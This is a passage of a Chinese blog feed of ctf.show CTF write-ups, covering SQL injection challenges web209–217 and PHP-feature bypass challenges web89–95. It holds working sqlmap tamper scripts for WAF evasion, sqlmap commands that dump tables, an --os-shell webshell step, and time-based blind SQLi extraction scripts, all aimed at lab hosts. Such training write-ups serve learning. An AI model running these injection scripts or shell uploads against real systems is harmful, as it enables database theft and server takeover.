operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;065b5d24-7ebf-4c8b-a9d8-ccf329caa2be.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;065b5d24-7ebf-4c8b-a9d8-ccf329caa2be.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web209.py --referer &quot;http:&#x2F;&#x2F;065b5d24-7ebf-4c8b-a9d8-ccf329caa2be.challenge.ctf.show&#x2F;sqlmap.php&quot; --dbms &quot;mysql&quot; --threads 3 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>说明需要对注入的字符串进行加密</p><p>strrev：返回 <code>string</code> 反转后的字符串。 </p><p>即我们只需要先base64加密然后进行反转，然后再进行base64加密，最后再进行反转；</p><p>所以只需反转回去即可：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    payload_ret <span class="token operator">=</span> retVal    retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload_ret<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;f37a365b-f382-478c-9d3b-1f19661809c6.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;f37a365b-f382-478c-9d3b-1f19661809c6.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --referer &quot;http:&#x2F;&#x2F;f37a365b-f382-478c-9d3b-1f19661809c6.challenge.ctf.show&#x2F;sqlmap.php&quot; --dbms &quot;mysql&quot; --threads 3 ctfshow_flavi -C ctfshow_flagxx --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题只是在210的基础上将空格过滤了，但web210.py本身就是在将空格过滤的脚本的基础上修改的，所以直接套用即可，payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;cb1b728a-dc92-47f9-b8ce-01dcc157a5b5.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;cb1b728a-dc92-47f9-b8ce-01dcc157a5b5.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --referer &quot;http:&#x2F;&#x2F;cb1b728a-dc92-47f9-b8ce-01dcc157a5b5.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web -T ctfshow_flavia --columns --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继续上题的脚本</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;21a73396-75ff-4108-98ee-bd688b5f749a.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;21a73396-75ff-4108-98ee-bd688b5f749a.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --referer &quot;http:&#x2F;&#x2F;21a73396-75ff-4108-98ee-bd688b5f749a.challenge.ctf.show&#x2F;sqlmap.php&quot; -D ctfshow_web --tables --columns --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;对查询字符进行解密  function decode($id)&#123;    return strrev(base64_decode(strrev(base64_decode($id))));  &#125;function waf($str)&#123;    return preg_match(&#39;&#x2F; |\*&#x2F;&#39;, $str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目提示说练习使用–os-shell 一键getshell</p><p>看了南神给的wp才知道其本质是上传两个文件，一个是命令执行的文件，另一个是可以让我们文件上传的文件，先尝试用212的payload：</p><pre class="line-numbers language-none"><code class="language-none">python2 sqlmap.py -u &quot;http:&#x2F;&#x2F;ae89f0bb-77a1-4bc2-806b-ae2aa533ed48.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;ae89f0bb-77a1-4bc2-806b-ae2aa533ed48.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --referer &quot;http:&#x2F;&#x2F;ae89f0bb-77a1-4bc2-806b-ae2aa533ed48.challenge.ctf.show&#x2F;sqlmap.php&quot; --threads&#x3D;3 --os-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_213a.png"></p><p>因为php是默认的所有选4</p><p><img src="/images/web_213b.png"></p><p>目录就选第一个</p><p><img src="/images/web_213c.png"></p><p>发现多了两个文件，直接访问他们，发现其中一个可以上传文件</p><p><img src="/images/web_213d.png"></p><p>接下来只需要上传一句话木马，再用蚁剑连接即可拿到flag</p><h4 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h4><p>sqlmap就暂停一段落了，开始时间盲注了</p><p>来到这题，发现找不到注入点，就只能通过bp去查看对应的数据包了，发现注入点在一个数据包中</p><p><img src="/images/web_214.png"></p><p>那么只需要修改之前190的脚本即可</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;d3ccbff4-4f2f-47b1-b0f1-742b2540e14d.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;dict &#x3D; &quot;1234567890qwer_,tyuiopasdfghjklzxcvbnm-&#123;&#125;&quot;flag &#x3D; &quot;&quot;for i in range(1,60):    max &#x3D; 127    min &#x3D; 32    while 1:        mid &#x3D; (max+min)&gt;&gt;1        if(min &#x3D;&#x3D; mid):            flag +&#x3D; chr(mid)            print(flag)            break        #payload &#x3D; &quot;if((ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_web        #payload &#x3D; &quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_flagx        #payload &#x3D; &quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #id,flaga        payload &#x3D; &quot;if((ascii(substr((select flaga from ctfshow_flagx),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        data &#x3D; &#123;            &quot;ip&quot;: payload,            &quot;debug&quot;: 1        &#125;        start &#x3D; time.time()        res &#x3D; requests.post(url &#x3D; url,data &#x3D;data)        end &#x3D; time.time()        sub &#x3D; end - start        if sub &gt;&#x3D; 2:            max &#x3D; mid        else:            min &#x3D; mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h4><p>题目说用了单引号，那么只需在上一题的脚本上加上单引号和or即可，payload</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;ca82acbd-ba7b-4464-8cb4-a7f0f57d0662.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;dict &#x3D; &quot;1234567890qwer_,tyuiopasdfghjklzxcvbnm-&#123;&#125;&quot;flag &#x3D; &quot;&quot;for i in range(1,60):    max &#x3D; 127    min &#x3D; 32    while 1:        mid &#x3D; (max+min)&gt;&gt;1        if(min &#x3D;&#x3D; mid):            flag +&#x3D; chr(mid)            print(flag)            break        #payload &#x3D; &quot;&#39; or if((ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_web        #payload &#x3D; &quot;&#39; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_flagx        #payload &#x3D; &quot;&#39; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #id,flaga        payload &#x3D; &quot;&#39; or if((ascii(substr((select flagaa from ctfshow_flagxc),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        data &#x3D; &#123;            &quot;ip&quot;: payload,            &quot;debug&quot;: 1        &#125;        start &#x3D; time.time()        res &#x3D; requests.post(url &#x3D; url,data &#x3D;data)        end &#x3D; time.time()        sub &#x3D; end - start        if sub &gt;&#x3D; 2:            max &#x3D; mid        else:            min &#x3D; mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h4><p>查询语句</p><pre class="line-numbers language-none"><code class="language-none">where id &#x3D; from_base64($id);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么我们只需要在215的基础上闭合括号即可</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;d26f1537-5119-4e2d-a45a-438fa182dba3.challenge.ctf.show&#x2F;api&#x2F;index.php&quot;dict &#x3D; &quot;1234567890qwer_,tyuiopasdfghjklzxcvbnm-&#123;&#125;&quot;flag &#x3D; &quot;&quot;for i in range(1,60):    max &#x3D; 127    min &#x3D; 32    while 1:        mid &#x3D; (max+min)&gt;&gt;1        if(min &#x3D;&#x3D; mid):            flag +&#x3D; chr(mid)            print(flag)            break        #payload &#x3D; &quot;&#39; or if((ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_web        #payload &#x3D; &quot;&#39; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #ctfshow_flagxcc        #payload &#x3D; &quot;&#39; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagx&#39;),&#123;&#125;,1))&lt;&#123;&#125;),sleep(2),1)#&quot;.format(i,mid)        #id,flagaac        payload &#x3D; &quot;&#39;&#39;) or if((ascii(substr((select flagaac from ctfshow_flagxcc),&#123;&#125;,1))&lt;&#123;&#125;),sleep(3),1)#&quot;.format(i,mid)        data &#x3D; &#123;            &quot;ip&quot;: payload,            &quot;debug&quot;: 1        &#125;        start &#x3D; time.time()        res &#x3D; requests.post(url &#x3D; url,data &#x3D; data)        end &#x3D; time.time()        sub &#x3D; end - start        if sub &gt;&#x3D; 3:            max &#x3D; mid        else:            min &#x3D; mid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h4><p>sql注入先暂告一段落，等后面的基础做得差不多了，再回来接着做</p>]]></content>
      
      
      <categories>
          
          <category> ctf_show </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web入门_sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_SHOW之web入门PHP特性部分wp</title>
      <link href="/2022/03/06/jian-web2/"/>
      <url>/2022/03/06/jian-web2/</url>
      
        <content type="html"><![CDATA[<h3 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h3><h4 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if(preg_match("/[0-9]/", $num))&#123;        die("no no no!");    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>intval:用于取变量的整数值（函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。）<br>preg_match：匹配正则表达式</p><p>第一个 if 判断是否有 GET 型 num 变量传进来，第二个 if 是判断变量 num 中是否有数字 0-9，如果有，则程序结束并输出“no no no”，第三 if 是取变量 num 的整数值，而 intval 函数用于 object 时会发生错误并返回 1，所以 payload：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num[]=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功取得 flag：ctfshow{074ac141-d164-4427-a67f-37a0347de8a7}</p><h4 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==="4476")&#123;        die("no no no!");    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>intval($var,$base):</li><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>将 4476 转换为 16 进制后再传输，payload 为：</li></ul><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=0x117c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功获得 flag：ctfshow{a28ff94c-052b-4c4b-95ca-2dfe90e83d88}</p><h4 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpshow_source(__FILE__);include('flag.php');$a=$_GET['cmd'];if(preg_match('/^php$/im', $a))&#123;    if(preg_match('/^php$/i', $a))&#123;        echo 'hacker';    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo 'nonononono';&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>/i 表示匹配大小写<br>字符 ^ 和 $ 同时使用时，表示精确匹配，需要匹配以 php 开头和以 php 结尾</p><p>/m 多行匹配 若存在换行\n 并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配，但是当出现换行符 <code>%0``a</code> 的时候，$cmd 的值会被当做两行处理，而此时第二个 if 正则匹配不符合以 php 开头和以 php 结尾 </p><p>所以 payload 可以为：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?cmd=%0aphp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>疑点，没想明白为什么?cmd=php%0a%a 也可以。<br>先接着做</p><p>flag 为：ctfshow{1b0b9324-9d17-42b9-a2fe-bbcf4e903d7c}</p><h4 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==4476)&#123;        die("no no no!");    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和 90 题相似，但换成了弱类型比较，可继续使用 90 题的 payload：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=0x117c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到 flag：ctfshow{58f0fb9a-f40a-4c11-98db-82f162926f3b}</p><h4 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==4476)&#123;        die("no no no!");    &#125;    if(preg_match("/[a-z]/i", $num))&#123;        die("no no no!");    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一次多了一个对字母过滤，就不能再用 16 进制了，可以使用 8 进制进行绕过<br>payload 为：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=010574<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到 flag：ctfshow{8ee86a68-94e7-43db-9f2e-01e5a74bf5c1}</p><h4 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==="4476")&#123;        die("no no no!");    &#125;    if(preg_match("/[a-z]/i", $num))&#123;        die("no no no!");    &#125;    if(!strpos($num, "0"))&#123;        die("no no no!");    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">strpos(string,find,start)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要搜索的字符串。</td></tr><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定在何处开始搜索。</td></tr></tbody></table><table><thead><tr><th align="left">返回值：</th><th align="left">返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。<br><strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</th></tr></thead></table><p>所以也就是要求传进的 num 中必须得含有 0 才能绕过，payload 为：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=4476.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag：ctfshow{8fbc9a71-cdff-4127-96f3-b3f4d63e1ebb}</p><h4 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h4><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">&lt;?phpinclude("flag.php");highlight_file(__FILE__);if(isset($_GET['num']))&#123;    $num = $_GET['num'];    if($num==4476)&#123;        die("no no no!");    &#125;    if(preg_match("/[a-z]|\./i", $num))&#123;        die("no no no!!");    &#125;    if(!strpos($num, "0"))&#123;        die("no no no!!!");    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一次比上一题多多虑了一个点.,但又必须有 0，所以采用 8 进制<br>intval 会对特殊字符+和空客进行删除，所以 payload 为：</p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">?num=+010574 或者?num= 010574<span 